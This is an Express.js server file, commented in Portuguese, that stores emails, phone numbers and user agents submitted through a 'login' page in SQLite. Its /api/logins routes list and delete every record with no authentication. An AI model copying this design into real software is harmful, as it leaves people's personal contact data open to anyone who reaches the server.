// server.js

// 1. Importar os módulos necessários
const express = require('express');
const Database = require('better-sqlite3');
const path = require("path");

// 2. Configurações iniciais
const app = express();

// ✅ A porta será fornecida pelo ambiente de produção (Render) ou será 3000 em modo local
const PORT = process.env.PORT || 3000; 

// ✅ O caminho do banco de dados será em uma pasta de dados persistente no Render
const DATA_DIR = process.env.RENDER_DISK_MOUNT_PATH || __dirname;
const DB_PATH = path.join(DATA_DIR, "database.db");

console.log("Iniciando o script do servidor...");

// 3. Middlewares (configurações do Express)
app.use(express.json()); // Para o servidor entender dados em formato JSON
app.use(express.static(path.join(__dirname, "public"))); // Para servir os arquivos estáticos (HTML, CSS, JS) da pasta 'public'

// 4. Conectar ao banco de dados e iniciar o servidor
try {
  // Conexão síncrona (mais simples) com o banco de dados.
  const db = new Database(DB_PATH);
  console.log("✅ Conectado ao banco de dados SQLite.");

  // Criar a tabela de logins se ela não existir (execução síncrona)
  db.exec(`CREATE TABLE IF NOT EXISTS logins (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT NOT NULL,
            phone TEXT NOT NULL,
            timestamp TEXT NOT NULL,
            userAgent TEXT
        )`);
  console.log('✔️ Tabela "logins" verificada/criada com sucesso.');

  // Rota para a página inicial
  app.get('/', (req, res) => {
    res.redirect('/index.html');
  });

  // 5. API Endpoints (as "rotas" da nossa aplicação)
  app.post("/api/login", (req, res) => {
    try {
      const { email, phone, userAgent } = req.body;
      if (!email || !phone) {
        return res.status(400).json({ error: "Email e telefone são obrigatórios." });
      }
      const timestamp = new Date().toISOString();
      // Usando 'prepared statements' para segurança e performance
      const stmt = db.prepare(`INSERT INTO logins (email, phone, timestamp, userAgent) VALUES (?, ?, ?, ?)`);
      const info = stmt.run(email, phone, timestamp, userAgent);
      console.log(`📥 Novo login salvo com ID: ${info.lastInsertRowid}`);
      res.status(201).json({ message: "Login salvo com sucesso!", id: info.lastInsertRowid });
    } catch (error) {
      console.error("Erro ao inserir no banco de dados:", error.message);
      res.status(500).json({ error: "Erro ao salvar os dados." });
    }
  });

  app.get("/api/logins", (req, res) => {
    try {
      const stmt = db.prepare(`SELECT * FROM logins ORDER BY timestamp DESC`);
      const rows = stmt.all();
      res.json(rows);
    } catch (error) {
      console.error("Erro ao buscar no banco de dados:", error.message);
      res.status(500).json({ error: "Erro ao buscar os dados." });
    }
  });

  // Rota para LIMPAR todos os logins (necessária para o botão em dados-login.html)
  app.delete("/api/logins", (req, res) => {
    try {
        db.exec(`DELETE FROM logins`);
        db.exec(`DELETE FROM sqlite_sequence WHERE name='logins'`); // Reseta o contador de ID
        console.log(`🗑️ Todos os dados de login foram limpos.`);
        res.status(200).json({ message: 'Todos os dados foram limpos com sucesso.' });
    } catch (error) {
        console.error("Erro ao limpar o banco de dados:", error.message);
        res.status(500).json({ error: "Erro ao limpar os dados." });
    }
  });

  // 6. Iniciar o servidor (agora que tudo está pronto)
  app.listen(PORT, () => {
    console.log("\n=========================================");
    console.log(`🚀 Servidor rodando em http://localhost:${PORT}`);
    console.log("=========================================\n");
    console.log(`➡️  Página de Login: http://localhost:${PORT}/index.html`);
    console.log(`➡️  (Ou acesse diretamente: http://localhost:${PORT}/)`);
    console.log(`➡️  Painel de Dados: http://localhost:${PORT}/dados-login.html`);
    console.log("\nPressione CTRL+C para parar o servidor.");
  });

} catch (error) {
  console.error("❌ Falha crítica ao iniciar o servidor:", error.message);
  process.exit(1); // Encerra o processo se não for possível iniciar
}
